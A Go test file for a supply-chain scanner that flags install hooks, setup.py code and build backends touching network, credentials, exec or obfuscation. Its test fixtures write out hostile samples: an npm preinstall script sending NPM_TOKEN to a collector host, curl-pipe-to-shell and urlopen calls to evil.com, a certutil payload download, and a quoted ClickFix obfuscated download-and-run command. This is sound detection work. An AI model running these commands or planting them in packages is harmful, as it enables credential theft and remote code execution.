package installsurface

import (
	"strings"
	"testing"
)

func hasCap(caps []Capability, want Capability) bool {
	for _, c := range caps {
		if c == want {
			return true
		}
	}
	return false
}

func TestAnalyzeIgnoresNonInstallScripts(t *testing.T) {
	s := Analyze(map[string]string{
		"test":  "jest",
		"build": "tsc",
		"start": "node index.js",
	}, nil)
	if len(s.Hooks) != 0 {
		t.Fatalf("non-install scripts produced %d hooks", len(s.Hooks))
	}
}

func TestAnalyzeChainDropShape(t *testing.T) {
	src := `const t = process.env.NPM_TOKEN;
	        const s = Buffer.from('aGVsbG8=','base64').toString('utf-8');
	        await fetch('https://collector.invalid/ingest',{method:'POST',body:t});
	        require('child_process').execSync(s);`
	read := func(rel string) ([]byte, bool) {
		if rel == "setup.mjs" {
			return []byte(src), true
		}
		return nil, false
	}
	s := Analyze(map[string]string{"preinstall": "node setup.mjs"}, read)
	if len(s.Hooks) != 1 {
		t.Fatalf("hooks = %d, want 1", len(s.Hooks))
	}
	h := s.Hooks[0]
	if h.Name != "preinstall" {
		t.Errorf("hook name = %q", h.Name)
	}
	for _, want := range []Capability{CapNetwork, CapCredentials, CapExec, CapObfuscation} {
		if !h.HasCap(want) {
			t.Errorf("missing capability %q", want)
		}
	}
	// The local artifact must be recorded AND read.
	var sawLocal, sawRemote bool
	for _, a := range h.Artifacts {
		if a.Ref == "setup.mjs" {
			sawLocal = true
			if !a.Read {
				t.Error("setup.mjs artifact not marked read")
			}
		}
		if a.Remote && a.Ref == "https://collector.invalid/ingest" {
			sawRemote = true
		}
	}
	if !sawLocal || !sawRemote {
		t.Errorf("artifacts = %+v (local=%v remote=%v)", h.Artifacts, sawLocal, sawRemote)
	}
	if len(h.Sinks) == 0 {
		t.Error("expected credential sinks")
	}
}

// The critical false-positive control: a legitimate native-build hook reads env
// and downloads a prebuilt binary. It must show network (and env) but NOT
// credentials, or it would be promoted to the block-class VC-002d.
func TestAnalyzeBenignNativeBuildIsNotCredentialed(t *testing.T) {
	read := func(string) ([]byte, bool) { return nil, false }
	s := Analyze(map[string]string{
		"install": "node-gyp rebuild || prebuild-install -r napi",
	}, read)
	if len(s.Hooks) != 1 {
		t.Fatalf("hooks = %d, want 1", len(s.Hooks))
	}
	if s.Hooks[0].HasCap(CapCredentials) {
		t.Error("benign native build wrongly classified as touching credentials")
	}
}

func TestProcessEnvIsEnvNotCredentials(t *testing.T) {
	read := func(rel string) ([]byte, bool) {
		return []byte(`if (process.env.CI) { console.log('ci'); }`), true
	}
	s := Analyze(map[string]string{"postinstall": "node check.js"}, read)
	h := s.Hooks[0]
	if h.HasCap(CapCredentials) {
		t.Error("bare process.env must not be a credential capability")
	}
	if !h.HasCap(CapEnv) {
		t.Error("bare process.env should register as CapEnv")
	}
}

func TestUnreadableArtifactRecordedAsUnread(t *testing.T) {
	s := Analyze(map[string]string{"preinstall": "node missing.js"}, func(string) ([]byte, bool) {
		return nil, false
	})
	h := s.Hooks[0]
	if len(h.Artifacts) != 1 || h.Artifacts[0].Read {
		t.Errorf("unreadable artifact should be recorded as unread: %+v", h.Artifacts)
	}
}

func TestStripPythonMetadataURLs_DictValue(t *testing.T) {
	source := `project_urls={
    "Source": "https://github.com/certifi/python-certifi",
    "Documentation": "https://certifi.readthedocs.io",
}
`
	cleaned := stripPythonMetadataURLs(source)
	if urlRe.MatchString(cleaned) {
		t.Errorf("dict-value URLs should be stripped, got: %s", cleaned)
	}
}

func TestStripPythonMetadataURLs_PreservesRealURLs(t *testing.T) {
	source := `import urllib.request
urllib.request.urlopen("https://evil.com/payload")
`
	cleaned := stripPythonMetadataURLs(source)
	if !strings.Contains(cleaned, "https://evil.com/payload") {
		t.Error("real network URLs should be preserved")
	}
}

func TestStripPythonMetadataURLs_Comments(t *testing.T) {
	source := `# See https://github.com/grpc/grpc/issues/22491
# http://www.apache.org/licenses/LICENSE-2.0
x = do_something()
`
	cleaned := stripPythonMetadataURLs(source)
	if urlRe.MatchString(cleaned) {
		t.Errorf("comment URLs should be stripped, got: %s", cleaned)
	}
}

func TestStripPythonMetadataURLs_LongDescription(t *testing.T) {
	source := `long_description = """
# My Package

[![Build](https://badge.fury.io/py/isort.svg)](https://badge.fury.io/py/isort)
See https://pycqa.github.io/isort/ for docs.
"""
setup(name="isort")
`
	cleaned := stripPythonMetadataURLs(source)
	if urlRe.MatchString(cleaned) {
		t.Errorf("long_description URLs should be stripped, got: %s", cleaned)
	}
	if !strings.Contains(cleaned, "setup(name=") {
		t.Error("code after long_description should be preserved")
	}
}

func TestStripPythonMetadataURLs_LongDescSingleLine(t *testing.T) {
	source := `long_description = """See https://example.com for info."""
x = real_code()
`
	cleaned := stripPythonMetadataURLs(source)
	if urlRe.MatchString(cleaned) {
		t.Errorf("single-line long_description URL should be stripped, got: %s", cleaned)
	}
}

func TestStripPythonMetadataURLs_PreservesCodeAfterBlock(t *testing.T) {
	source := `long_description = """
Docs at https://docs.example.com
"""
urlopen("https://evil.com/exfil")
`
	cleaned := stripPythonMetadataURLs(source)
	if !strings.Contains(cleaned, "https://evil.com/exfil") {
		t.Error("URL after long_description block should be preserved")
	}
}

func TestObfuscatedSchemeDetection(t *testing.T) {
	tests := []struct {
		name  string
		input string
		want  bool
	}{
		{"caret", `cmd = "h^t^t^p^s://evil.com"`, true},
		{"dot", `s = "h.t.t.p://evil.com"`, true},
		{"concat", `"h"+"t"+"t"+"p"+"s"`, true},
		{"clean", `url = "https://example.com"`, false},
		{"word", `the http protocol`, false},
	}
	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			caps, _ := scanCaps(tt.input)
			got := hasCap(caps, CapObfuscation)
			if got != tt.want {
				t.Errorf("obfuscation detection = %v, want %v for %q", got, tt.want, tt.input)
			}
		})
	}
}

func TestClickFixEvasionPatterns(t *testing.T) {
	// Real-world ClickFix campaign command
	clickfix := `cmd.exe /c start "" /min cmd /v:on /k "set bufX=where c*u*r*l.e?e&set ldrY=where p*ell.exe&for /f %i in ('where c*d.e?e')do %i /c "for /f %k in ('!bufX!')do %k h^t^t^p^s^:^/^/^o^n^e^-^v^e^r^i^f^.^l^o^l^/o^|for /f %j in ('!ldrY!')do %j -WindowStyle Hidden""`

	caps, ev := scanCaps(clickfix)
	for _, want := range []Capability{CapObfuscation, CapNetwork, CapExec} {
		if !hasCap(caps, want) {
			t.Errorf("missing %q in ClickFix detection, evidence: %v", want, ev)
		}
	}

	// Verify specific evidence markers
	evStr := strings.Join(ev, " ")
	if !strings.Contains(evStr, "obfuscated-scheme") {
		t.Error("missing obfuscated-scheme evidence")
	}
	if !strings.Contains(evStr, "wildcard-exe") {
		t.Error("missing wildcard-exe evidence")
	}
	if !strings.Contains(evStr, "cmd-delayed-expansion") {
		t.Error("missing cmd-delayed-expansion evidence")
	}
}

func TestFingerExeDetection(t *testing.T) {
	caps, _ := scanCaps(`finger.exe user@evil.com`)
	if !hasCap(caps, CapNetwork) {
		t.Error("finger.exe should trigger CapNetwork")
	}
}

func TestCertutilDetection(t *testing.T) {
	caps, _ := scanCaps(`certutil -urlcache -split -f https://evil.com/payload.exe`)
	if !hasCap(caps, CapNetwork) {
		t.Error("certutil should trigger CapNetwork")
	}
}

func TestWildcardExeNotFalsePositive(t *testing.T) {
	// Normal code shouldn't trigger wildcard-exe
	caps, _ := scanCaps(`const config = require('./config')`)
	if hasCap(caps, CapObfuscation) {
		t.Error("normal require should not trigger obfuscation")
	}
}

func TestSetupPyMetadataURLNotFlaggedAsNetwork(t *testing.T) {
	setupPy := `
from setuptools import setup
__url__ = "https://github.com/example/project"
setup(
    name="example",
    url="https://github.com/example/project",
    project_urls={
        "Source": "https://github.com/example/project",
        "Docs": "https://example.readthedocs.io",
    },
)
`
	hooks := analyzeSetupPy(setupPy)
	for _, h := range hooks {
		if h.HasCap(CapNetwork) {
			t.Errorf("metadata-only setup.py should not have CapNetwork, evidence: %v", h.Evidence)
		}
	}
}

func TestSetupPyRealNetworkEgressStillDetected(t *testing.T) {
	setupPy := `
from setuptools import setup
import urllib.request
urllib.request.urlopen("https://evil.com/payload")
`
	hooks := analyzeSetupPy(setupPy)
	if len(hooks) == 0 {
		t.Fatal("expected hooks from setup.py with real network egress")
	}
	if !hooks[0].HasCap(CapNetwork) {
		t.Error("real network call should still trigger CapNetwork")
	}
	// The URL should appear as an artifact since it's on a network-call line
	var found bool
	for _, a := range hooks[0].Artifacts {
		if a.Ref == "https://evil.com/payload" {
			found = true
		}
	}
	if !found {
		t.Error("URL on network-call line should be recorded as artifact")
	}
}

func TestSetupPyReadmeURLsNotNetwork(t *testing.T) {
	// Simulates isort-style setup.py with inline README as long_description
	setupPy := `
setup_kwargs = {
    'name': 'isort',
    'long_description': '[![isort](https://raw.githubusercontent.com/pycqa/isort/main/art/logo.png)](https://pycqa.github.io/isort/)',
    'url': 'https://pycqa.github.io/isort/',
}
setup(**setup_kwargs)
`
	hooks := analyzeSetupPy(setupPy)
	for _, h := range hooks {
		if h.HasCap(CapNetwork) {
			t.Errorf("README badge URLs should not trigger CapNetwork, evidence: %v", h.Evidence)
		}
	}
}

// Regression for the beats live-fire: network client-name markers embedded in a
// setup.py long_description README (example code, tool names) or the description
// are package METADATA, not install-time egress — a string literal passed to
// setup() never executes. They must not raise CapNetwork (VC-002b). This was the
// FP on backoff / deprecated / pyasn1.
func TestSetupPyReadmeNetworkWordsNotNetwork(t *testing.T) {
	setupPy := `
from setuptools import setup
setup(
    name="backoff",
    description="Function decoration for backoff and retry; wraps requests.get and aiohttp calls",
    long_description="""
Backoff
=======
Example::

    import requests
    @backoff.on_exception(backoff.expo, requests.exceptions.RequestException)
    def get_url(url):
        return requests.get(url)

You can also curl the endpoint or use httpx.get() / urllib.request.urlopen().
""",
    url="https://github.com/litl/backoff",
)
`
	hooks := analyzeSetupPy(setupPy)
	for _, h := range hooks {
		if h.HasCap(CapNetwork) {
			t.Errorf("network words in long_description/description are metadata, not egress; evidence: %v", h.Evidence)
		}
	}
}

// Guard against over-stripping: a shell cradle passed to os.system is a COMMAND
// string, not a doc field, and must still raise CapNetwork even though a benign
// network word sits in long_description.
func TestSetupPyCradleInCommandStringStillDetected(t *testing.T) {
	setupPy := `
from setuptools import setup
import os
os.system("curl https://evil.com/p.sh | sh")
setup(name="evil", long_description="benign readme mentioning requests.get for docs")
`
	hooks := analyzeSetupPy(setupPy)
	var net bool
	for _, h := range hooks {
		if h.HasCap(CapNetwork) {
			net = true
		}
	}
	if !net {
		t.Error("a real curl cradle in os.system(...) must still raise CapNetwork when long_description is stripped")
	}
}

func TestExtractBuildRequiresSingleLine(t *testing.T) {
	toml := `[build-system]
requires = ["setuptools>=64", "wheel"]
build-backend = "setuptools.build_meta"
`
	got := ExtractBuildRequires(toml)
	want := []string{"setuptools>=64", "wheel"}
	if len(got) != len(want) {
		t.Fatalf("ExtractBuildRequires = %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("entry %d = %q, want %q", i, got[i], want[i])
		}
	}
}

func TestExtractBuildRequiresMultiLine(t *testing.T) {
	toml := `[build-system]
requires = [
    "scikit-build-core>=0.5",
    "cython",
]
build-backend = "scikit_build_core.build"
`
	got := ExtractBuildRequires(toml)
	want := []string{"scikit-build-core>=0.5", "cython"}
	if len(got) != len(want) {
		t.Fatalf("ExtractBuildRequires = %v, want %v", got, want)
	}
	for i := range want {
		if got[i] != want[i] {
			t.Errorf("entry %d = %q, want %q", i, got[i], want[i])
		}
	}
}

func TestExtractBuildRequiresAbsent(t *testing.T) {
	if got := ExtractBuildRequires(`[project]
name = "foo"
`); got != nil {
		t.Errorf("ExtractBuildRequires with no [build-system] = %v, want nil", got)
	}
}

func TestIsKnownBuildBackend(t *testing.T) {
	tests := []struct {
		backend string
		want    bool
	}{
		{"setuptools.build_meta", true},
		{"setuptools.build_meta:__legacy__", true},
		{"hatchling.build", true},
		{"poetry.core.masonry.api", true},
		{"evil_backend.api", false},
		{"", false},
	}
	for _, tt := range tests {
		if got := IsKnownBuildBackend(tt.backend); got != tt.want {
			t.Errorf("IsKnownBuildBackend(%q) = %v, want %v", tt.backend, got, tt.want)
		}
	}
}

func TestMatchBuildBackendRequiresExact(t *testing.T) {
	matched, ok, ambiguous := MatchBuildBackendRequires(
		"scikit_build_core.build", []string{"scikit-build-core==0.8.0", "cython"})
	if !ok || ambiguous {
		t.Fatalf("ok=%v ambiguous=%v, want ok=true ambiguous=false", ok, ambiguous)
	}
	if matched != "scikit-build-core==0.8.0" {
		t.Errorf("matched = %q, want %q", matched, "scikit-build-core==0.8.0")
	}
}

func TestMatchBuildBackendRequiresAmbiguous(t *testing.T) {
	_, ok, ambiguous := MatchBuildBackendRequires(
		"scikit_build_core.build", []string{"scikit-build-core==0.8.0", "scikit_build_core==0.9.0"})
	if ok {
		t.Error("ok should be false when more than one candidate matches")
	}
	if !ambiguous {
		t.Error("ambiguous should be true when more than one candidate matches")
	}
}

func TestMatchBuildBackendRequiresMissing(t *testing.T) {
	_, ok, ambiguous := MatchBuildBackendRequires("evil_backend.api", []string{"requests==2.31.0"})
	if ok || ambiguous {
		t.Errorf("ok=%v ambiguous=%v, want both false when no candidate matches", ok, ambiguous)
	}
}

func TestSetupPyCommentAndErrorURLsNotNetwork(t *testing.T) {
	setupPy := `
# See https://github.com/grpc/grpc/issues/22491
# http://www.apache.org/licenses/LICENSE-2.0
raise RuntimeError("""
    Upgrade pip: https://pip.pypa.io/en/stable/installing/#upgrading-pip
""")
`
	hooks := analyzeSetupPy(setupPy)
	for _, h := range hooks {
		if h.HasCap(CapNetwork) {
			t.Errorf("comment/error message URLs should not trigger CapNetwork, evidence: %v", h.Evidence)
		}
	}
}

// TestMatchBuildBackendRequiresCompound covers the report's PLAUSIBLE call site
// (HoneyBadger Vanguard, iHBV-TM-022, §4). "setuptools>=64,<70" is the ordinary
// way a real pyproject.toml bounds its build backend. Pre-fix, pep508.Split
// returned the name as "setuptools>=64," from that entry, so the match against
// the backend module "setuptools" failed and analyzeBuildBackend stamped a
// FALSE "missing-requires-entry" on a backend that was in fact declared.
func TestMatchBuildBackendRequiresCompound(t *testing.T) {
	cases := []struct {
		name     string
		backend  string
		requires []string
		want     string
		ok       bool
	}{
		{"compound", "setuptools.build_meta", []string{"setuptools>=64,<70"}, "setuptools>=64,<70", true},
		{"single clause control", "setuptools.build_meta", []string{"setuptools>=64"}, "setuptools>=64", true},
		{"compound non-standard backend", "evil_backend.api", []string{"evil-backend>=1,<2"}, "evil-backend>=1,<2", true},
		{"compound with extras", "hatchling.build", []string{"hatchling[extra]>=1.0,<2"}, "hatchling[extra]>=1.0,<2", true},
		{"genuinely absent", "setuptools.build_meta", []string{"wheel>=0.4,<1"}, "", false},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got, ok, ambiguous := MatchBuildBackendRequires(c.backend, c.requires)
			if ambiguous {
				t.Fatalf("MatchBuildBackendRequires(%q, %v) reported ambiguous", c.backend, c.requires)
			}
			if ok != c.ok || got != c.want {
				t.Errorf("MatchBuildBackendRequires(%q, %v) = (%q, %v), want (%q, %v)",
					c.backend, c.requires, got, ok, c.want, c.ok)
			}
		})
	}
}

// TestAnalyzeBuildBackendCompoundRequiresIsNotMissing asserts the evidence tag
// for a compound requires entry names the matched entry rather than falsely
// claiming the backend was never declared.
func TestAnalyzeBuildBackendCompoundRequiresIsNotMissing(t *testing.T) {
	toml := `
[build-system]
requires = ["evil-backend>=1.0,<2.0"]
build-backend = "evil_backend.api"
`
	s := AnalyzePython("", toml, nil)
	if len(s.Hooks) != 1 {
		t.Fatalf("hooks = %d, want 1", len(s.Hooks))
	}
	var sawMatched, sawMissing bool
	for _, e := range s.Hooks[0].Evidence {
		if e == "build-backend-requires:evil-backend>=1.0,<2.0" {
			sawMatched = true
		}
		if e == "missing-requires-entry" {
			sawMissing = true
		}
	}
	if sawMissing {
		t.Error("compound requires entry produced a FALSE missing-requires-entry")
	}
	if !sawMatched {
		t.Errorf("evidence = %v, want it to name the matched compound entry", s.Hooks[0].Evidence)
	}
}

// TestExtractBuildRequiresCompoundNotShredded guards a defect found while
// testing the PEP 508 parser fix: ExtractBuildRequires split the TOML array on
// every comma, including commas INSIDE a quoted element. A compound specifier
// is the ordinary way a real pyproject.toml bounds its backend, so
// "setuptools>=64,<70" became two bogus entries.
//
// The second case is the material one. "evil-backend==64.0.0,!=64.1" fragmented
// into "evil-backend==64.0.0", which pep508.Split reads as an exact PIN — so a
// range was resolved to a guessed concrete version and buildbackend.go then
// fetched and analyzed that version. D-01 forbids exactly that.
func TestExtractBuildRequiresCompoundNotShredded(t *testing.T) {
	cases := []struct {
		name string
		toml string
		want []string
	}{
		{
			"compound bound",
			"[build-system]\nrequires = [\"setuptools>=64,<70\"]\n",
			[]string{"setuptools>=64,<70"},
		},
		{
			"compound containing ==",
			"[build-system]\nrequires = [\"evil-backend==64.0.0,!=64.1\"]\n",
			[]string{"evil-backend==64.0.0,!=64.1"},
		},
		{
			"several elements, one compound",
			"[build-system]\nrequires = [\"setuptools>=64,<70\", \"wheel\"]\n",
			[]string{"setuptools>=64,<70", "wheel"},
		},
		{
			"multi-line with a compound",
			"[build-system]\nrequires = [\n  \"setuptools>=64,<70\",\n  \"cython>=3,<4\",\n]\n",
			[]string{"setuptools>=64,<70", "cython>=3,<4"},
		},
		{
			"single quotes",
			"[build-system]\nrequires = ['setuptools>=64,<70']\n",
			[]string{"setuptools>=64,<70"},
		},
	}
	for _, c := range cases {
		t.Run(c.name, func(t *testing.T) {
			got := ExtractBuildRequires(c.toml)
			if len(got) != len(c.want) {
				t.Fatalf("ExtractBuildRequires = %q, want %q", got, c.want)
			}
			for i := range c.want {
				if got[i] != c.want[i] {
					t.Errorf("entry %d = %q, want %q", i, got[i], c.want[i])
				}
			}
		})
	}
}
